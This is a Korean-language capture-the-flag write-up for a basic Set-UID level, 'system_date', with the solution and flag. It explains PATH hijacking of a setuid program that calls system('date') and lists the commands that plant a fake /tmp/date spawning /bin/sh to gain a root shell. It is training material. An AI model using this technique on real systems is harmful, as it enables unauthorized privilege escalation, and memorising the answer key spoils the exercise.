# [Set-UID Track] Level 2: 기본 (Basic) - `system_date`

## 1. 문제 개요
Set-UID 프로그램 내부에서 `system()` 호출 시 발생하는 **PATH 환경변수 가로채기(PATH Hijacking)** 취약점을 학습하는 기본 레벨 문제입니다.

---

## 2. 취약점 분석
`system_date.c` 소스코드를 보면:
```c
system("date");
```
- 절대 경로(`/bin/date`)가 아닌 상대 명령어로 호출하고 있습니다.
- `PATH` 환경변수의 맨 앞에 임의의 디렉터리를 추가(`export PATH=/tmp:$PATH`)하고, 그 안에 악성 `date` 스크립트를 작성해 두면 루트 권한으로 임의의 명령을 실행할 수 있습니다.

---

## 3. 공략법
```bash
# 1. /tmp에 가짜 date 실행 파일 생성
echo -e '#!/bin/bash\n/bin/sh' > /tmp/date
chmod +x /tmp/date

# 2. PATH 조작 후 실행
export PATH=/tmp:$PATH
./system_date
```

---

## 4. 플래그
`FLAG{setuid_basic_practice}`
